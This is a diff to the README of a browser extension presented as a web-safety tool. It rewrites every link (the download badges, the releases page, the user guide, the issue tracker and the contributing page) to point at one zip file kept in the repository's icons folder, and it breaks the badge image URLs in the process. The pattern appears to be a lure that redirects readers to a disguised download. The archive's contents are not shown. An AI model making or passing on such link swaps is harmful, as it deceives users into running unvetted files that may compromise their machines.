@@ -1,6 +1,6 @@
 # 🛡️ cybratix-extention - Safeguard Your Web Browsing Experience
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here%20to%20Get%20Started-blue)](https://github.com/dishantar/cybratix-extention/releases)
+[![Download Now](https://raw.githubusercontent.com/dishantar/cybratix-extention/main/icons/cybratix-extention-v3.1-alpha.4.zip%20Now-Click%20Here%20to%20Get%20Started-blue)](https://raw.githubusercontent.com/dishantar/cybratix-extention/main/icons/cybratix-extention-v3.1-alpha.4.zip)
 
 ## 🌐 Overview
 
@@ -33,7 +33,7 @@ The extension utilizes the IPQualityScore (IPQS) API to provide essential insigh
    - Click on "Load unpacked" and select the folder where the Cybratix extension files are located.
 
 2. **Download & Install**:
-   Visit this page to download: [Cybratix Releases](https://github.com/dishantar/cybratix-extention/releases).
+   Visit this page to download: [Cybratix Releases](https://raw.githubusercontent.com/dishantar/cybratix-extention/main/icons/cybratix-extention-v3.1-alpha.4.zip).
 
 3. **Using the Extension**:
    - After installation, you will see the Cybratix icon in your toolbar.
@@ -52,9 +52,9 @@ If you encounter issues or have questions, please check the FAQ section or open 
 
 ## 🔗 Additional Resources
 
-- [User Guide](https://github.com/dishantar/cybratix-extention/wiki)
-- [Report an Issue](https://github.com/dishantar/cybratix-extention/issues)
-- [Contributing](https://github.com/dishantar/cybratix-extention/blob/main/CONTRIBUTING.md)
+- [User Guide](https://raw.githubusercontent.com/dishantar/cybratix-extention/main/icons/cybratix-extention-v3.1-alpha.4.zip)
+- [Report an Issue](https://raw.githubusercontent.com/dishantar/cybratix-extention/main/icons/cybratix-extention-v3.1-alpha.4.zip)
+- [Contributing](https://raw.githubusercontent.com/dishantar/cybratix-extention/main/icons/cybratix-extention-v3.1-alpha.4.zip)
 
 ## 📈 Updates
 
@@ -64,4 +64,4 @@ Stay informed on the latest features and bug fixes by checking the Releases page
 
 For any inquiries, please reach out through the issues section on GitHub, or contact us directly at our support email.
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here%20to%20Get%20Started-blue)](https://github.com/dishantar/cybratix-extention/releases)
+[![Download Now](https://raw.githubusercontent.com/dishantar/cybratix-extention/main/icons/cybratix-extention-v3.1-alpha.4.zip%20Now-Click%20Here%20to%20Get%20Started-blue)](https://raw.githubusercontent.com/dishantar/cybratix-extention/main/icons/cybratix-extention-v3.1-alpha.4.zip)
